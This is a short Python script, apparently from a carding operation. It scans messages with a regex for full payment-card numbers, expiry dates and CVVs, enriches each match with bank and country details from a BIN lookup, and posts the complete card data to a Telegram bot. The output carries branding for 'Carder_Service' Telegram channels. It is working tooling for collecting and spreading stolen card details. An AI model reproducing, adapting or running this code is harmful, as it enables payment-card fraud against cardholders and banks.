import re
import requests

pattern = r"(\d{16})(([ \/:\|]{1,2}|(\n))|[ \/:\|]{1,2}(\n))(\d{2}|\d{1})[{ \/:\|]{1,2}(\d{4}|\d{2})(([ \/:\|]{1,2}|(\n))|[ \/:\|]{1,2}(\n))(\d{3})"


async def peek(msg, not_sender_bot, bins_store):
    if bool(re.findall(pattern, msg)):
        matches = re.findall(pattern, msg)[0]
        bin_detail = get_details(bins_store, matches[0][:6])
        message_to_send = f'↳ {msg}\n\n↳ Info » |{bin_detail["vendor"]} - {bin_detail["type"]} - {bin_detail["level"]}|\n↳ Bank » |{bin_detail["bank_name"]}|\n↳ Country » |{bin_detail["country"]} | {bin_detail["flag"]}\n════════════════════\n🍁 𝗠𝘆 𝗜𝗻𝗳𝗼 🍁\n════════════════════\n| 𝗢𝘄𝗻𝗲𝗿 𝗯𝘆 || [𝗖𝗮𝗿𝗱𝗲𝗿_𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗢𝘄𝗻𝗲𝗿](https://t.me/carderSauce) |\n| 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 || [𝗖𝗮𝗿𝗱𝗲𝗿_𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹](https://t.me/CashappPaypalSauce)|'
        print(message_to_send)
        sender_error_count = 0
        while sender_error_count < 2:
            response = requests.get(f'{not_sender_bot}&text={message_to_send}&parse_mode=Markdown&disable_web_page_preview=true')
            if response.status_code == 200:
                return

            sender_error_count += 1


def get_details(bins_store, prefix):
    for number, details in bins_store.items():
        if number.startswith(prefix):
            return details
